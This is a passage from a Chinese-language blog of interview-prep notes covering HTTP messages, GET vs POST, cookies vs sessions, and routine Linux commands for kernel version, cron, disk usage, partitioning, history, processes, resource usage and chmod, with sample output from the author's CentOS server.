对象，供上层使用。</p>\n<p>HTTP 响应报文也是由三部分组成: <strong>状态码</strong>，<strong>响应报头</strong>和<strong>响应报文</strong>。</p>\n</blockquote>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/aHR0cDovL2RsLml0ZXllLmNvbS91cGxvYWQvYXR0YWNobWVudC8wMDY5LzM0NTEvNDEyYjQ0NTEtMjczOC0zZWJjLWIxZjYtYTBjYzEzYjk2OTdiLmpwZw\" alt=\"img\" style=\"zoom:80%;\" />\n<blockquote>\n<p>①是请求方法，GET 和 POST 是最常见的 HTTP 方法，除此以外还包括 DELETE、HEAD、OPTIONS、PUT、TRACE。不过，当前的大多数浏览器只支持 GET 和 POST</p>\n<p>②为请求对应的 URL 地址，它和报文头的 Host 属性组成完整的请求 URL。</p>\n<p>③是协议名称及版本号。</p>\n<p>④是 HTTP 的报文头，报文头包含若干个属性，格式为 “属性名：属性值”，服务端据此获取客户端的信息。</p>\n<p>⑤是报文体，它将一个页面表单中的组件值通过 param1=value1&amp;m2=value2 的键值对形式编码成一个格式化串，它承载多个请求参数的数据。不但报文体可以传递请求参数，请求 URL 也可以通过类似于 “/chapter15/user.html? param1=value1&amp;m2=value2” 的方式传递请求参数。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/aHR0cDovL2RsLml0ZXllLmNvbS91cGxvYWQvYXR0YWNobWVudC8wMDY5LzM0ODcvY2RjNGRiYmItZjk4ZS0zMWQ1LTgyNzAtM2MzN2JmMWM1NGU1LmpwZw\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/aHR0cDovL2RsLml0ZXllLmNvbS91cGxvYWQvYXR0YWNobWVudC8wMDY5LzM0OTIvYmRkYjAwYjYtYTNlMS0zMTEyLWE0ZjQtNGIzY2I4Njg3YzcwLmpwZw\" alt=\"img\"></p>\n<blockquote>\n<p>①报文协议及版本；<br>\n②状态码及状态描述；<br>\n③响应报文头，也是由多个属性组成；<br>\n④响应报文体，服务器返回给浏览器的文本信息，通常 HTML, CSS, JS, 图片等文件就放在这一部分。</p>\n</blockquote>\n<h4 id=\"get和post区别汉得\"><a class=\"markdownIt-Anchor\" href=\"#get和post区别汉得\">#</a> get 和 post 区别（汉得）</h4>\n<blockquote>\n<p>Form 中的 get 和 post 方法，在数据传输过程中分别对应了 HTTP 协议中的 GET 和 POST 方法。二者主要区别如下：</p>\n<ul>\n<li>1、Get 是用来从服务器上获得数据，而 Post 是用来向服务器上传递数据。</li>\n<li>2、Get 将表单中数据的按照 variable=value 的形式，添加到 action 所指向的 URL 后面，并且两者使用 “?” 连接，而各个变量之间使用 “&amp;” 连接；Post 是将表单中的数据放在 form 的数据体中，按照变量和值相对应的方式，传递到 action 所指向 URL。</li>\n<li>3、Get 是不安全的，因为在传输过程，数据被放在请求的 URL 中，而如今现有的很多服务器、代理服务器或者用户代理都会将请求 URL 记录到日志文件中，然后放在某个地方，这样就可能会有一些隐私的信息被第三方看到。另外，用户也可以在浏览器上直接看到提交的数据，一些系统内部消息将会一同显示在用户面前。Post 的所有操作对用户来说都是不可见的。</li>\n<li>4、Get 传输的数据量小，这主要是因为受 URL 长度限制；而 Post 可以传输大量的数据，所以在上传文件只能使用 Post（当然还有一个原因，将在后面的提到）。</li>\n<li>5、Get 限制 Form 表单的数据集的值必须为 ASCII 字符；而 Post 支持整个 ISO10646 字符集。</li>\n<li>6、Get 是 Form 的默认方法。</li>\n</ul>\n<p>使用 Post 传输的数据，可以通过设置编码的方式正确转化中文；而 Get 传输的数据却没有变化。在以后的程序中，我们一定要注意这一点。</p>\n</blockquote>\n<h4 id=\"session和cookie区别汉得\"><a class=\"markdownIt-Anchor\" href=\"#session和cookie区别汉得\">#</a> session 和 cookie 区别（汉得）</h4>\n<blockquote>\n<p>1.Cookie 的工作原理<br>\n（1）浏览器端第一次发送请求到服务器端</p>\n<p>（2）服务器端创建 Cookie，该 Cookie 中包含用户的信息，然后将该 Cookie 发送到浏览器端</p>\n<p>（3）浏览器端再次访问服务器端时会携带服务器端创建的 Cookie</p>\n<p>（4）服务器端通过 Cookie 中携带的数据区分不同的用户</p>\n<p>————————————————</p>\n<p>2.Session 的工作原理</p>\n<p>（1）浏览器端第一次发送请求到服务器端，服务器端创建一个 Session，同时会创建一个特殊的 Cookie（name 为 JSESSIONID 的固定值，value 为 session 对象的 ID），然后将该 Cookie 发送至浏览器端</p>\n<p>（2）浏览器端发送第 N（N&gt;1）次请求到服务器端，浏览器端访问服务器端时就会携带该 name 为 JSESSIONID 的 Cookie 对象</p>\n<p>（3）服务器端根据 name 为 JSESSIONID 的 Cookie 的 value (sessionId), 去查询 Session 对象，从而区分不同用户。</p>\n<p>name 为 JSESSIONID 的 Cookie 不存在（关闭或更换浏览器），返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>name 为 JSESSIONID 的 Cookie 存在，根据 value 中的 SessionId 去寻找 session 对象</p>\n<p>value 为 SessionId 不存在 **（Session 对象默认存活 30 分钟）**，返回 1 中重新去创建 Session 与特殊的 Cookie</p>\n<p>value 为 SessionId 存在，返回 session 对象</p>\n<p>————————————————</p>\n<p>(1) cookie 数据存放在客户的浏览器上，session 数据放在服务器上，但是服务端的 session 的实现对客户端的 cookie 有依赖关系的；</p>\n<p>(2) cookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗，如果主要考虑到安全应当使用 session</p>\n<p>(3) session 会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，如果主要考虑到减轻服务器性能方面，应当使用 COOKIE</p>\n<p>(4) 单个 cookie 在客户端的限制是 3K，就是说一个站点在客户端存放的 COOKIE 不能 3K。</p>\n<p>(5) 所以：将登陆信息等重要信息存放为 SESSION; 其他信息如果需要保留，可以放在 COOKIE 中</p>\n</blockquote>\n<h3 id=\"9一些linux命令\"><a class=\"markdownIt-Anchor\" href=\"#9一些linux命令\">#</a> 9. 一些 linux 命令</h3>\n<h4 id=\"0liunx查看内核版本发行版特斯拉茄子\"><a class=\"markdownIt-Anchor\" href=\"#0liunx查看内核版本发行版特斯拉茄子\">#</a> 0.Liunx 查看内核版本，发行版 (特斯拉，茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# uname -r</span><br><span class=\"line\">3.10.0-1160.45.1.el7.x86_64</span><br><span class=\"line\">//3 –内核版本   10 –重大修订  0 –轻微修订  1160 –错误修复</span><br><span class=\"line\">2.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# uname -a</span><br><span class=\"line\">Linux VM-16-11-centos 3.10.0-1160.45.1.el7.x86_64 #1 SMP Wed Oct 13 17:20:51 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class=\"line\">Linux –内核名称。 如果在BSD或macOS上运行相同的命令，结果将有所不同。</span><br><span class=\"line\">VM-16-11-centos –主机名</span><br><span class=\"line\">3.10.0-1160.45.1.el7c –内核版本</span><br><span class=\"line\">#1 SMP Wed Oct 13 17:20:51 UTC 2021 – 这意味着Ubuntu编译了3.10.0-1160.45.1.el7 1次。最后的编译时间戳也在那里。</span><br><span class=\"line\">x86_64 –机器架构</span><br><span class=\"line\">x86_64 –处理器架构</span><br><span class=\"line\">x86_64 –操作系统体系结构（您可以在64位处理器上运行32位OS）</span><br><span class=\"line\">GNU/Linux –操作系统（不，它不会显示发行名称）</span><br><span class=\"line\">3.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# cat /proc/version</span><br><span class=\"line\">Linux version 3.10.0-1160.45.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Wed Oct 13 17:20:51 UTC 2021</span><br><span class=\"line\">4.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# dmesg | grep Linux</span><br><span class=\"line\">[    0.000000] Linux version 3.10.0-1160.45.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Wed Oct 13 17:20:51 UTC 2021</span><br><span class=\"line\"></span><br><span class=\"line\">Ubuntu 完整的桌面 Linux 操作系统</span><br><span class=\"line\">Fedora 是商业版RedHat的上游。</span><br><span class=\"line\">Debian 应用程序最丰富的 Linux 发行版。</span><br><span class=\"line\">openSUSE 成为最简单易用、最广泛的发行版</span><br><span class=\"line\">kali dddd</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"crontab-的含义茄子\"><a class=\"markdownIt-Anchor\" href=\"#crontab-的含义茄子\">#</a> crontab * 的含义 (茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Example of job definition:</span><br><span class=\"line\"># .---------------- minute (0 - 59)</span><br><span class=\"line\"># |  .------------- hour (0 - 23)</span><br><span class=\"line\"># |  |  .---------- day of month (1 - 31)</span><br><span class=\"line\"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class=\"line\"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class=\"line\"># |  |  |  |  |</span><br><span class=\"line\"># *  *  *  *  * user-name  command to be executed</span><br><span class=\"line\"></span><br><span class=\"line\">vim /etc/crontab</span><br><span class=\"line\">crontab -u root -e</span><br><span class=\"line\">crontab -u root -l</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看linux文件夹大小茄子\"><a class=\"markdownIt-Anchor\" href=\"#查看linux文件夹大小茄子\">#</a> 查看 linux 文件夹大小 (茄子)</h4>\n<blockquote>\n<p>先来说明一件事：</p>\n<p>drwxr-xr-x   5 root root 4.0K Apr  5  2022 src<br>\ndrwxr-xr-x   2 www  www  4.0K Apr  5  2022 maomao</p>\n<ul>\n<li>文件储存在硬盘上，硬盘的最小存储单位叫做 “扇区”（Sector）。每个扇区储存 512 字节（相当于 0.5KB）。</li>\n<li>操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个 “块”（block）。这种由多个扇区组成的 “块”，是文件存取的最小单位。“块” 的大小，最常见的是 4KB，即连续八个 sector 组成一个 block。</li>\n<li>文件数据都储存在 “块” 中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做 inode，中文译名为 “索引节点”。</li>\n<li>每一个文件都有对应的 inode，里面包含了与该文件有关的一些信息。</li>\n</ul>\n<p>而 Linux 系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所包含文件的文件名，以及该文件名对应的 inode 号码。</p>\n<p><strong>所以 ls -al 命令实际显示的就是目录文件的大小。又因为 OS 定义的文件最小存取单位 “块”（block）是 4KB，所以目录一般显示为 4096B。</strong></p>\n</blockquote>\n<p>[<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWlpaWhlci9wLzg1MTEzNTEuaHRtbA==\">svc] 为何 linux ext4 文件系统目录默认大小是 4k? - _毛台 - 博客园 (cnblogs.com)</span></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/806469-20180305205644145-2050317113.png\" alt=\"img\" style=\"zoom:67%;\" />\n<blockquote>\n<p>[lighthouse@VM-16-11-centos ]$ du -h -d 0 sqllab/<br>\n9.2M    sqllab/</p>\n<ol>\n<li>-h , 简单可读的现实大小，自动判断 B,K,M,G…</li>\n<li>-d 0 , 现实列表深度为 0，就是只现实.kde 目录的占用，如果 - d 1 会显示第一级文件的大小，以此类推</li>\n</ol>\n<p>du -sh 命令，可查看当前文件夹的总大小</p>\n<p>du -h --max-depth=1<br>\n9.2M    ./sqllab<br>\n32K     ./maomao<br>\n59M     ./wordpress<br>\n199M    ./besides<br>\n13M     ./src<br>\n5.6M    ./sqli<br>\n223M    ./vulhub<br>\n377M    ./keshe<br>\n44M     ./html<br>\n942M    .</p>\n</blockquote>\n<h4 id=\"分区挂载过程茄子\"><a class=\"markdownIt-Anchor\" href=\"#分区挂载过程茄子\">#</a> 分区挂载过程 (茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（1）虚拟机添加硬盘</span><br><span class=\"line\"> fdisk -l</span><br><span class=\"line\">（2）分区</span><br><span class=\"line\">fdisk /dev/sdb</span><br><span class=\"line\">e 即分为逻辑分区，按 p 即分为主分区</span><br><span class=\"line\">+1024m</span><br><span class=\"line\">（3）格式化</span><br><span class=\"line\">mkfs -t ext3 -c /dev/sdb1mkfs -t ext3 -c /dev/sdb1</span><br><span class=\"line\">（4）挂载</span><br><span class=\"line\">mount /dev/sdb1 /mnt</span><br><span class=\"line\">（5）设置可以自动挂载</span><br><span class=\"line\">vim /etc/fstab</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看历史命令查看自己的和别人的深信服\"><a class=\"markdownIt-Anchor\" href=\"#查看历史命令查看自己的和别人的深信服\">#</a> 查看历史命令，查看自己的和别人的 (深信服)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">history</span><br><span class=\"line\">history命令后面可以加选项：</span><br><span class=\"line\">-c：清空历史命令（包括缓存和文件）</span><br><span class=\"line\">-w：把缓存中的历史命令写入历史命令保存文件~/.bash_history（显然每个用户有自己的文件）</span><br><span class=\"line\">-r\t将命令历史文件中的内容读入到目前shell的history记忆中【就是按↑能翻到】</span><br><span class=\"line\">数字#\t列出最近的#条命令</span><br><span class=\"line\"></span><br><span class=\"line\">历史命令最多可以保存1000条，可以在/etc/profile中进行修改：</span><br><span class=\"line\">source /etc/profile使环境变量生效。</span><br><span class=\"line\">history -c 只能清除history命令查看的，不能清除.bash_history文件中的，需要自己手动删除</span><br><span class=\"line\"></span><br><span class=\"line\">查看别人的，去别人家目录看.bash_history</span><br><span class=\"line\"></span><br><span class=\"line\">查看history时，还能看执行时间</span><br><span class=\"line\">vim /etc/profile</span><br><span class=\"line\">export HISTTIMEFORMAT=&quot;%Y-%m-%d %H:%M:%S &quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"定时任务有哪些宏杉\"><a class=\"markdownIt-Anchor\" href=\"#定时任务有哪些宏杉\">#</a> 定时任务有哪些 (宏杉)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab //前面讲过</span><br><span class=\"line\">at 一次性任务</span><br><span class=\"line\">at +时间</span><br><span class=\"line\">atq</span><br><span class=\"line\">atrm jobid</span><br><span class=\"line\">at 10:00      #输入“at  时间”；开始设置at   ，支持am、pm           </span><br><span class=\"line\">at&gt; touch /home/cjk      #输入任务内容</span><br><span class=\"line\">at&gt; echo &quot;hello&quot; &gt;&gt; /home/cjk&lt;EOT&gt; </span><br></pre></td></tr></table></figure>\n<h4 id=\"linux启动过程宏杉\"><a class=\"markdownIt-Anchor\" href=\"#linux启动过程宏杉\">#</a> linux 启动过程 (宏杉)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux系统的启动过程并不是大家想象中的那么复杂，其过程可以分为5个阶段：</span><br><span class=\"line\"></span><br><span class=\"line\">内核的引导。</span><br><span class=\"line\">\t当计算机打开电源后，首先是BIOS开机自检，按照BIOS中设置的启动设备（通常是硬盘）来启动。</span><br><span class=\"line\">\t操作系统接管硬件以后，首先读入 /boot 目录下的内核文件。</span><br><span class=\"line\">运行 init。</span><br><span class=\"line\">\tinit 进程是系统所有进程的起点，你可以把它比拟成系统所有进程的老祖宗，没有这个进程，系统中任何进程都不会启动。</span><br><span class=\"line\">\tinit 程序首先是需要读取配置文件 /etc/inittab。</span><br><span class=\"line\">\t运行级别</span><br><span class=\"line\">\t\t许多程序需要开机启动。它们在Windows叫做&quot;服务&quot;（service），在Linux就叫做&quot;守护进程&quot;（daemon）。</span><br><span class=\"line\">\t\tinit进程的一大任务，就是去运行这些开机启动的程序。</span><br><span class=\"line\">\t\tLinux允许为不同的场合，分配不同的开机启动程序，这就叫做&quot;运行级别&quot;（runlevel）。也就是说，启动时根据&quot;运行级别&quot;，确定要运行哪些程序。</span><br><span class=\"line\">系统初始化。</span><br><span class=\"line\">    在init的配置文件中有这么一行： si::sysinit:/etc/rc.d/rc.sysinit　它调用执行了/etc/rc.d/rc.sysinit</span><br><span class=\"line\">    而rc.sysinit是一个bash shell的脚本，它主要是完成一些系统初始化的工作，rc.sysinit是每一个运行级别都要首先运行的重要脚本。</span><br><span class=\"line\">    它主要完成的工作有：激活交换分区，检查磁盘，加载硬件模块以及其它一些需要优先执行任务。</span><br><span class=\"line\">建立终端 。</span><br><span class=\"line\">\trc执行完毕后，返回init。这时基本系统环境已经设置好了，各种守护进程也已经启动了。</span><br><span class=\"line\">\tinit接下来会打开6个终端，以便用户登录系统。在inittab中的以下6行就是定义了6个终端：</span><br><span class=\"line\">\t同时它会显示一个文本登录界面，这个界面就是我们经常看到的登录界面，在这个登录界面中会提示用户输入用户名</span><br><span class=\"line\">\t而用户输入的用户将作为参数传给login程序来验证用户的身份。</span><br><span class=\"line\">用户登录系统。</span><br><span class=\"line\">\t一般来说，用户的登录方式有三种：</span><br><span class=\"line\">        （1）命令行登录</span><br><span class=\"line\">        （2）ssh登录</span><br><span class=\"line\">        （3）图形界面登录</span><br></pre></td></tr></table></figure>\n<h4 id=\"linux运行级别amazon\"><a class=\"markdownIt-Anchor\" href=\"#linux运行级别amazon\">#</a> linux 运行级别 (amazon)</h4>\n<blockquote>\n<p>Linux 系统有 7 个运行级别 (runlevel)：</p>\n<ul>\n<li>运行级别 0：系统停机状态，系统默认运行级别不能设为 0，否则不能正常启动</li>\n<li>运行级别 1：单用户工作状态，root 权限，用于系统维护，禁止远程登录</li>\n<li>运行级别 2：多用户状态 (没有 NFS)</li>\n<li>运行级别 3：完全的多用户状态 (有 NFS)，登录后进入控制台命令行模式</li>\n<li>运行级别 4：系统未使用，保留</li>\n<li>运行级别 5：X11 控制台，登录后进入图形 GUI 模式</li>\n<li>运行级别 6：系统正常关闭并重启，默认运行级别不能设为 6，否则不能正常启动</li>\n</ul>\n</blockquote>\n<h4 id=\"linux进程状态汉得\"><a class=\"markdownIt-Anchor\" href=\"#linux进程状态汉得\">#</a> linux 进程状态（汉得）</h4>\n<blockquote>\n<p>3 running, 144 sleeping,   0 stopped,   1 zombie</p>\n</blockquote>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/875796-20190926175737431-422827153.png\" alt=\"img\" style=\"zoom:67%;\" />\n<h4 id=\"查看服务是否运行汉得\"><a class=\"markdownIt-Anchor\" href=\"#查看服务是否运行汉得\">#</a> 查看服务是否运行（汉得）</h4>\n<blockquote>\n<p>ps ef  和  ps aux</p>\n<p>[root@VM-16-11-centos ~]# ps -ef | grep sshd<br>\nroot      2896     1  0 Mar22 ?        00:01:56 /usr/sbin/sshd -D<br>\nroot     11786  2896  0 09:52 ?        00:00:00 sshd: lighthouse [priv]<br>\nlightho+ 11800 11786  0 09:52 ?        00:00:00 sshd: lighthouse@pts/0<br>\nroot     13538 11930  0 09:57 pts/0    00:00:00 grep --color=auto sshd</p>\n<p>ps aux 最初用到 Unix Style 中，而 ps -ef 被用在 System V Style 中，两者输出略有不同。</p>\n<p>其中 STAT 状态位常见的状态字符有<br>\n D   // 无法中断的休眠状态（通常 IO 的进程）；<br>\nR   // 正在运行可中在队列中可过行的；<br>\nS   // 处于休眠状态；<br>\nT   // 停止或被追踪；<br>\nW   // 进入内存交换 （从内核 2.6 开始无效）；<br>\nX   // 死掉的进程 （基本很少见）；<br>\nZ   // 僵尸进程；<br>\n&lt;   // 优先级高的进程<br>\n N   // 优先级较低的进程<br>\n L   // 有些页被锁进内存；<br>\ns   // 进程的领导者（在它之下有子进程）；<br>\nl   // 多线程，克隆线程（使用 CLONE_THREAD, 类似 NPTL pthreads）；<br>\n+   // 位于后台的进程组；</p>\n</blockquote>\n<h4 id=\"查看服务器cpu内存磁盘利用率linux版本汉得\"><a class=\"markdownIt-Anchor\" href=\"#查看服务器cpu内存磁盘利用率linux版本汉得\">#</a> 查看服务器 CPU，内存，磁盘利用率，linux 版本（汉得）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.查看内存使用率</span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM-16-11-centos ~]# free -h</span><br><span class=\"line\">              total        used        free      shared  buff/cache   available</span><br><span class=\"line\">Mem:           1.8G        685M        149M         12M        1.0G        947M</span><br><span class=\"line\">Swap:          1.0G        374M        650M</span><br><span class=\"line\">[root@VM-16-11-centos ~]# vmstat</span><br><span class=\"line\">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class=\"line\"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class=\"line\"> 3  0 383388 153348 213388 813048    0    0     2    26    0    1  3  1 95  0  0</span><br><span class=\"line\"></span><br><span class=\"line\">2.查看CPU使用率</span><br><span class=\"line\">[root@VM-16-11-centos ~]# top</span><br><span class=\"line\">top - 10:07:30 up 217 days, 10:19,  1 user,  load average: 0.42, 0.30, 0.21</span><br><span class=\"line\">Tasks: 150 total,   3 running, 146 sleeping,   0 stopped,   1 zombie</span><br><span class=\"line\">%Cpu(s):  3.0 us,  1.0 sy,  0.0 ni, 96.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class=\"line\">[root@VM-16-11-centos ~]# cat /proc/cpuinfo  | grep physical | uniq -c</span><br><span class=\"line\">      1 physical id     : 0</span><br><span class=\"line\">      1 address sizes   : 46 bits physical, 48 bits virtual</span><br><span class=\"line\">[root@VM-16-11-centos ~]# dmidecode</span><br><span class=\"line\"># dmidecode 3.2</span><br><span class=\"line\">Getting SMBIOS data from sysfs.</span><br><span class=\"line\">SMBIOS 2.8 present.</span><br><span class=\"line\">9 structures occupying 398 bytes.</span><br><span class=\"line\">Table at 0x000F6A20.</span><br><span class=\"line\">...... </span><br><span class=\"line\"></span><br><span class=\"line\">3.查看磁盘利用率</span><br><span class=\"line\">[root@VM-16-11-centos ~]# df -h</span><br><span class=\"line\">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class=\"line\">devtmpfs        908M     0  908M   0% /dev</span><br><span class=\"line\">tmpfs           919M   32K  919M   1% /dev/shm</span><br><span class=\"line\">tmpfs           919M  1.1M  918M   1% /run</span><br><span class=\"line\">tmpfs           919M     0  919M   0% /sys/fs/cgroup</span><br><span class=\"line\">/dev/vda1        50G   21G   27G  43% /</span><br><span class=\"line\">tmpfs           184M     0  184M   0% /run/user/0</span><br><span class=\"line\">tmpfs           184M     0  184M   0% /run/user/1000</span><br><span class=\"line\">overlay          50G   21G   27G  43% /var/lib/docker/overlay2/6abafa18f5d96ab29f1273e0173f6573cb815fdfef8b88e2911fe106021c5cdc/merged</span><br><span class=\"line\">[root@VM-16-11-centos ~]# fdisk -l</span><br><span class=\"line\"></span><br><span class=\"line\">Disk /dev/vda: 53.7 GB, 53687091200 bytes, 104857600 sectors</span><br><span class=\"line\">Units = sectors of 1 * 512 = 512 bytes</span><br><span class=\"line\">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class=\"line\">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class=\"line\">Disk label type: dos</span><br><span class=\"line\">Disk identifier: 0x0009ac89</span><br><span class=\"line\"></span><br><span class=\"line\">   Device Boot      Start         End      Blocks   Id  System</span><br><span class=\"line\">/dev/vda1   *        2048   104857566    52427759+  83  Linux</span><br><span class=\"line\"></span><br><span class=\"line\">4.进程</span><br><span class=\"line\">ps -ef ps -aux</span><br><span class=\"line\"></span><br><span class=\"line\">5.内核</span><br><span class=\"line\">uname -a</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzIxNDA2\">Linux 系统查看 CPU、机器型号、内存等信息 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<h4 id=\"chmod改变文件所属者汉得\"><a class=\"markdownIt-Anchor\" href=\"#chmod改变文件所属者汉得\">#</a> chmod (改变文件所属者)（汉得）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 777 /home/aaa/aaa.sh</span><br><span class=\"line\">chmod +x ./ssb.sh</span><br><span class=\"line\">chmod -R 644 a.txt</span><br><span class=\"line\">chmod 4775 file //设置了特殊权限位</span><br></pre></td></tr></table></figure>\n<h4 